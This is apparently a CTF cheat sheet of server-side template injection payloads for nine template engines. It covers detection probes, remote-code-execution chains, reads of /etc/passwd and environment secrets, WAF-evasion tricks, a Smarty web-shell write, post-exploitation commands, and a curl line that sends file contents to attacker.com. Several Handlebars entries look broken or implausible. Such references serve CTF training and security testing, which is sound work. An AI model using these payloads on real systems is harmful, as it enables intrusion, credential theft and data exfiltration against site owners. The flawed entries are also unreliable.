# SSTI Payloads - CTF Cheat Sheet

## Quick Reference

| Engine | Detection | RCE (Short) | File Read |
|--------|-----------|------------|-----------|
| **Jinja2** | `{{7*'7'}}` → `7777777` | `{{cycler.__init__.__globals__.os.popen('id').read()}}` | `{{cycler.__init__.__globals__.__builtins__.open('/flag.txt').read()}}` |
| **Twig** | `{{7*'7'}}` → `7777777` | `{{['id'\|filter('system')}}` | `{{['cat /flag.txt'\|filter('system')}}` |
| **FreeMarker** | `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}` |
| **Mako** | `${7*7}` → `49` | `${''.join(__import__('os').popen('id').readlines())}` | `${''.join(__import__('os').popen('cat /flag.txt').readlines())}` |
| **Pebble** | `{{7*7}}` → `49` | `{{ execute('id') }}` | `{{ execute('cat /flag.txt') }}` |
| **Velocity** | `#set($x=7*7)$x` → `49` | `#set($rt=$class.forName('java.lang.Runtime').getRuntime())#set($proc=$rt.exec('id'))` | `#set($rt=$class.forName('java.lang.Runtime').getRuntime())#set($proc=$rt.exec('cat /flag.txt'))` |
| **Smarty** | `{7*7}` → `49` | `{system('id')}` | `{system('cat /flag.txt')}` |
| **ERB** | `<%= 7*7 %>` → `49` | `<%= system('id') %>` | `<%= File.open('/flag.txt').read %>` |
| **Handlebars** | `{{7*7}}` → `49` (if SSTI) | `{{#with (as |x|x)}}{{#each [1]}}{{#with (../../../etc/passwd)}}{{this}}{{/with}}{{/each}}{{/with}}` | `{{#with (as |x|x)}}{{#each [1]}}{{#with (../../../flag.txt)}}{{this}}{{/with}}{{/each}}{{/with}}` |

---

## Jinja2 (Python / Flask)

**Detection:**
```python
{{7*7}}      → 49
{{7*'7'}}    → 7777777
{{config}}   → Flask config (if present)
```

**RCE Payloads:**
```python
# Shortest
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}

# With arguments
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}
{{cycler.__init__.__globals__.os.popen('ls -la /').read()}}

# Alternative chains
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via subclass enumeration
{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['os'].popen('id').read()}}
```

**File Read Payloads:**
```python
# Via open()
{{cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}
{{lipsum.__globals__.__builtins__.open('/flag.txt').read()}}

# Via popen()
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}
{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}

# Via subclass
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
```

**Bypass Payloads (WAF Evasion):**
```python
# Bypass {{}}
{%print(7*7)%}
{%set x=7*7%}{{x}}

# Bypass quotes
{{request.args.x}}         # ?x=command
{{request.values.x}}

# Bypass dots
{{''['__class__']}}
{{''|attr('__class__')}}

# Bypass underscores
{{''['\x5f\x5fclass\x5f\x5f']}}

# Bypass keywords
{{"__im"+"port__"}}
{{"o"+"s"}}

# Bypass + chain
{{cycler.__init__.__globals__['o'+'s'].popen('id').read()}}
```

**CTF One-Liners:**
```python
{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}  # ?cmd=cat /flag.txt
{{cycler.__init__.__globals__.os.environ}}  # Check env variables
{{lipsum.__globals__.os.listdir('/')}}  # List directory
```

---

## Twig (PHP / Symfony)

**Detection:**
```
{{7*7}}    → 49
{{7*'7'}}  → 7777777
```

**RCE Payloads:**
```php
# Direct system call
{{['id']|filter('system')}}
{{['whoami']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}

# Via registerUndefinedFilterCallback
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Via attribute access
{{_self.env.getFilter("system")("id")}}

# Alternative chains
{{_self.env.enableDebug()}}
{{_self.env.runtimeLoader.sourceContexts}}
```

**File Read Payloads:**
```php
{{['cat /etc/passwd']|filter('system')}}
{{['cat /flag.txt']|filter('system')}}

# Via PHP functions
{{['php function readfile("/etc/passwd")']|filter('system')}}
```

**CTF One-Liners:**
```php
{{['cat /flag.txt; env']|filter('system')}}
{{['ls -la / && cat /flag.txt']|filter('system')}}
```

---

## FreeMarker (Java)

**Detection:**
```
${7*7}  → 49
```

**RCE Payloads:**
```java
# Via Execute class
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}

# Advanced (ObjectConstructor)
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder",["id"]).start()}

# Via Runtime
<#assign rt=?api.class.protectionDomain.codeSource.location.class>
${rt}
```

**File Read Payloads:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
```

**CTF One-Liners:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt; env")}
```

---

## Mako (Python)

**Detection:**
```
${7*7}  → 49
```

**RCE Payloads:**
```python
# Via import
${''.join(__import__('os').popen('id').readlines())}
${''.join(__import__('os').popen('whoami').readlines())}

# Via system
${__import__('os').system('id')}
${__import__('os').system('cat /flag.txt')}

# Via popen
${''.join(__import__('os').popen('ls -la /').readlines())}
```

**File Read Payloads:**
```python
${''.join(__import__('os').popen('cat /etc/passwd').readlines())}
${''.join(__import__('os').popen('cat /flag.txt').readlines())}

# Direct file read
${open('/etc/passwd').read()}
${open('/flag.txt').read()}
```

**CTF One-Liners:**
```python
${''.join(__import__('os').popen('cat /flag.txt; env').readlines()}}
```

---

## Pebble (Java)

**Detection:**
```
{{7*7}}  → 49
```

**RCE Payloads:**
```
{{ execute('id') }}
{{ execute('whoami') }}
{{ execute('cat /etc/passwd') }}

# With arguments
{{ execute('ls -la /') }}
{{ execute('cat /flag.txt') }}
```

**File Read Payloads:**
```
{{ execute('cat /etc/passwd') }}
{{ execute('cat /flag.txt') }}
```

---

## Velocity (Java)

**Detection:**
```
#set($x=7*7)$x  → 49
```

**RCE Payloads:**
```java
# Via Runtime.exec()
#set($rt=$class.forName('java.lang.Runtime').getRuntime())
#set($proc=$rt.exec('id'))
#set($proc.waitFor())

# With command
#set($rt=$class.forName('java.lang.Runtime').getRuntime())
#set($proc=$rt.exec('whoami'))

# One-liner attempt
#set($rt=$class.forName('java.lang.Runtime'))#set($runtime=$rt.getRuntime())#set($proc=$runtime.exec('id'))$proc.waitFor()
```

**File Read Payloads:**
```java
#set($rt=$class.forName('java.lang.Runtime').getRuntime())
#set($proc=$rt.exec('cat /etc/passwd'))

#set($rt=$class.forName('java.lang.Runtime').getRuntime())
#set($proc=$rt.exec('cat /flag.txt'))
```

---

## Smarty (PHP)

**Detection:**
```
{7*7}  → 49
```

**RCE Payloads:**
```php
# Direct function call
{system('id')}
{system('whoami')}
{system('cat /etc/passwd')}

# Via exec
{exec('id')}
{exec('whoami')}

# Via PHP tag
{php}system('id');{/php}
{php}system('cat /flag.txt');{/php}

# Via file write
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
```

**File Read Payloads:**
```php
{system('cat /etc/passwd')}
{system('cat /flag.txt')}

# Via readfile
{php}readfile('/flag.txt');{/php}
```

---

## ERB (Ruby / Rails)

**Detection:**
```
<%= 7*7 %>  → 49
```

**RCE Payloads:**
```ruby
# Direct system call
<%= system('id') %>
<%= system('whoami') %>
<%= system('cat /etc/passwd') %>

# Via backticks
<%= `id` %>
<%= `whoami` %>
<%= `cat /flag.txt` %>

# Via IO.popen
<%= IO.popen('id').readlines() %>
<%= IO.popen('cat /etc/passwd').readlines() %>

# Via eval
<%= eval('system("id")') %>
```

**File Read Payloads:**
```ruby
<%= File.open('/etc/passwd').read %>
<%= File.open('/flag.txt').read %>

<%= IO.read('/etc/passwd') %>
<%= IO.read('/flag.txt') %>
```

**CTF One-Liners:**
```ruby
<%= `cat /flag.txt; env` %>
```

---

## Handlebars (JavaScript / Node.js)

**Detection:**
```
{{7*7}}  → 49 (if vulnerable)
```

**RCE Payloads:**
```
# Via helper functions (limited)
{{#if (eq this.constructor.name "Object")}}RCE{{/if}}

# File traversal / SSRF
{{#with (as |x|x)}}{{#each [1]}}{{#with (../../../etc/passwd)}}{{this}}{{/with}}{{/each}}{{/with}}

# Prototype pollution attempt
{{constructor.prototype.isAdmin=true}}

# Helper callback injection (context-dependent)
{{#each this}}{{#if (eq @key "constructor")}}{{@value}}{{/if}}{{/each}}
```

**File Read Payloads:**
```
# Limited without backend support
{{#with (as |x|x)}}{{#each [1]}}{{#with (../../../flag.txt)}}{{this}}{{/with}}{{/each}}{{/with}}
```

---

## Polyglot Payloads (Test Multiple Engines)

**Detection Polyglot:**
```
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

**RCE Polyglot (less reliable):**
```
Try each engine's payload separately — polyglots for RCE rarely work
```

---

## Generic Testing Protocol

**Step 1: Basic Math**
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
```

**Step 2: String Repeat**
```
{{7*'7'}}
${7*'7'}
<%= 7*'7' %>
```

**Step 3: Identify**
- Result `7777777` → Jinja2/Twig/Mako
- Result `49` → Most others
- Error message → Reveals engine/version

**Step 4: Engine-Specific RCE**
- Pick from payloads above
- Adjust for environment

**Step 5: CTF Extraction**
```
cat /flag.txt
env | grep FLAG
ls -la /
```

---

## Common CTF Flag Locations

- `/flag.txt`
- `/flag`
- `/root/flag.txt`
- `FLAG` environment variable
- `/tmp/flag`
- `~flag`
- Database queries
- Config files

---

## CTF Quick Commands

```bash
# List directory
id
whoami
pwd
ls -la /
ls -la .

# Read files
cat /flag.txt
cat /etc/passwd
cat /proc/self/environ

# Environment
env
printenv
echo $FLAG

# Check permissions
sudo -l
id -G

# Find flags
find / -name "*flag*" 2>/dev/null
grep -r "flag" / 2>/dev/null
```

---

## WAF Bypass Techniques

**Bypass Template Delimiters:**
```
{%print(payload)%}
{%set x=payload%}{{x}}
${payload}
{{payload}}
```

**Bypass Quotes:**
```
{{request.args.x}}
{{request.values.x}}
chr(34) or similar
```

**Bypass Dots:**
```
{{''['__class__']}}
{{''|attr('__class__')}}
{{getattr(obj, attr_name)}}
```

**Bypass Underscores:**
```
\x5f (hex)
\u005f (unicode)
{{request.args.x}} where x=__class__
```

**Bypass Keywords:**
```
String concatenation: "o"+"s"
Request params: {{request.args.cmd}}
Hex/Unicode: \x5f\x5fos\x5f\x5f
```

---

## Key Takeaways

✅ **Always start with `{{7*7}}`** — if you see `49`, there's likely SSTI

✅ **String repetition test `{{7*'7'}}`** — `7777777` = Jinja2/Twig/Mako

✅ **Each engine has unique syntax** — test detection payloads first

✅ **Jinja2's cycler/lipsum are most reliable** — use for Flask/Python targets

✅ **WAF bypass with `request.args`** — pass payloads out-of-band to evade filters

✅ **Check environment variables first** — many CTF flags stored in `os.environ`

✅ **Blind SSTI? Use time-based or OOB exfil** — `curl http://attacker.com/?d=$(cat /flag.txt)`
